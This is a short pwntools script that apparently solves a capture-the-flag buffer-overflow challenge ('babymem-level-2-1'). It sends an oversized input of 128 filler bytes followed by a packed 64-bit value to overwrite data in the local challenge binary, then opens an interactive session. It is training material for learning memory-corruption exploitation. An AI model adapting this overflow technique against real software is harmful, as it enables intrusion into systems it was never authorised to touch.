from pwn import *

elf = ELF("/challenge/babymem-level-2-1")
p = elf.process()

p.sendline(b"5000")

# Look at the size of the buffer duh, it's in the declaration in ghidra
payload = b"A"*128 + p64(240324168)

p.sendline(payload)

p.interactive()
